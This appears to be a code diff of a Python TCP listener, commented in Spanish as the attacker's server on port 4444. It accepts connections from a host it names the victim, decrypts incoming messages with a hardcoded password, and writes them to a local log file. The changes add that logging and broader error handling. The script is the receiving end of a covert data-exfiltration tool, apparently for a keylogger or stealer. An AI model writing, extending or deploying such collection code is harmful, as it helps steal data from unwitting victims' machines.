@@ -12,7 +12,7 @@ import json
 
 
 # Funcion que desencripta dado un diccionario codificado y una contraseña
-def decrypt(enc_dict, password):
+def desencriptar(enc_dict, password):
     # decodifica el diccionario en base 64 
     salt = b64decode(enc_dict['salt'])
     textoCifrado = b64decode(enc_dict['textoCifrado'])
@@ -32,13 +32,22 @@ def decrypt(enc_dict, password):
     #Retorna el texto desencriptado
     return decrypted
 
+def escribirEnArchivoLog(mensaje):
+    file = open("log.log", "a")
+
+    file.write('mensaje: {!r}\n'.format(mensaje))
+
+    file.close()
+
+
+
 
 
 # Crea el socket TCP/IP 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # configura el socket del atacante 
-direccionServidor = ('192.168.1.49', 4444)
+direccionServidor = ('192.168.1.50', 4444)
 print('Incia la conexión {} por el puerto {}'.format(*direccionServidor))
 sock.bind(direccionServidor)
 sock.listen(1)
@@ -49,12 +58,21 @@ while True:
     try:
         print('Cliente conectado:', direccionVictima)
         while True:
-            data = conexion.recv(4096)
-            print('mensaje {!r}'.format(decrypt(json.loads(data), "hola")))
-            if data:
-                conexion.sendall(data)
-            else:
-                break
-    finally:
-        conexion.close()
+            try:
+                data = conexion.recv(4096)
+                #print('mensaje {!r}'.format(decrypt(data)))
+                mensajeDesencriptado = desencriptar(json.loads(data), "hola");
+                escribirEnArchivoLog(mensajeDesencriptado)
+                print('mensaje {!r}'.format(mensajeDesencriptado))
+                if data:
+                    conexion.sendall(data)
+                else:
+                    #print("Conexion perdida")
 
+                    break
+            except:
+                break
+                
+    finally:
+        print("Conexion perdida")
+       # conexion.close()
